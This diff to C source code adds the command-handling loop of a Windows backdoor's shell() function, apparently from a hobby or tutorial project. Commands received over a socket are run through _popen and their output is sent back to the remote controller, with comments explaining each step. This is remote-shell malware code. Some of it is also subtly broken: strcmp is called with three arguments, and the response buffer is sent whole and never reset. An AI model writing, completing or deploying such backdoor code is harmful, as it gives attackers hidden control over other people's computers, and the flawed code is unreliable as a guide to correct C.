@@ -52,6 +52,41 @@ void shell()
       //3rd size of the buffer variable.
       //4th argument is 0, because not specify any argument beside the function.
       recv(sock, buffer, 1024, 0);
+
+
+      //Compare the buffer with different commands.
+      //if q represent quit the program implment it == strcmp.
+      if (strcmp("q", buffer, 1) == 0)
+      {
+        closesocket(sock);//close socket
+        WSACleanup();//clean socket object
+        exit(0);//exit the program
+      }
+      else 
+      {
+        //let's create a file descripter.
+        FILE *fp;//It will point to the specific memory.
+        //want to open file as a process.
+        fp = _popen(buffer, "r"); // simply telling the program to execute the buffer by reading it > "r".
+        //Now need to get the reponse from the computer. by reading the buffer.
+        while(fgets(container, 1024, fp) != NULL)
+        {
+          //The process is want to read and execute buffer and storing the output in the container variable fits to 1024 bytes.
+          //Some time the reponse is larger than 1024 bytes which will store to total reponse varible which 17 MB.
+          //Concatinating same output of the container to total_response if output get larger.
+
+          strcat(total_reponse, container);
+        } 
+        //Need to send the total response to the server.
+        //0 is specify not indicating anything beside this.
+        send(sock, total_reponse, sizeof(total_reponse), 0);
+
+        //Once working with file descriptor want to close it.
+        fclose(fp);
+
+      }
+      
+
     }
 }
 
